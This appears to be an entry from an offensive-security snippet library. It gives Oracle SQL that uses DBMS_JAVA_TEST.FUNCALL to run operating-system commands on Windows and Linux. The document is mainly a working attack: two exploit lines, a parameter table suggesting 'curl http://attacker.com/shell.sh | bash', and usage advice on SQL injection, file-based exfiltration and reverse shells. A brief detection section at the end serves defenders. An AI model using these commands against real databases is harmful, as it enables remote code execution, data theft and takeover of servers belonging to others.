---
id: 8a563a1d-5ab4-4465-9b15-b25cbc3dbc48
name: execute-os-command-via-dbms-java-test-funcall
type: code
language: sql
verified: true
created_at: '2023-04-06T03:56:35.305193+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Oracle Database
  - Windows
  - Linux
tags:
  - oracle
  - java
  - rce
  - os-execution
validated: true
---

# execute-os-command-via-dbms-java-test-funcall

## Code

```sql
SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\windows\\system32\\cmd.exe','/c', 'dir >c:\test.txt') FROM DUAL
SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','/bin/ls>/tmp/OUT2.LST') from dual
```

## Description

This snippet uses DBMS_JAVA_TEST.FUNCALL to execute OS commands via the Aurora Wrapper class, supporting both Windows and Linux for tasks like directory listing and file creation.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 'c:\\windows\\system32\\cmd.exe' | Windows command path | '/bin/sh' |
| '/c' | Windows arg separator | '-c' |
| 'dir >c:\test.txt' | Command to run | 'whoami > /tmp/whoami.txt' |
| '/bin/bash' | Linux shell path | '/usr/bin/python' |
| '/bin/ls>/tmp/OUT2.LST' | Linux command | 'curl http://attacker.com/shell.sh | bash' |

## Usage

Inject via SQLi or execute directly after permissions grant. Redirect output to files for exfiltration. Adapt commands for reverse shells or downloads.

## Detection

- Audit trails of DBMS_JAVA_TEST.FUNCALL with Wrapper class.
- Unexpected file creations in temp directories.
- Network activity from DB server if commands involve downloads.

## Related

- [[procedures/Oracle-SQL-and-Java-Command-Execution]]
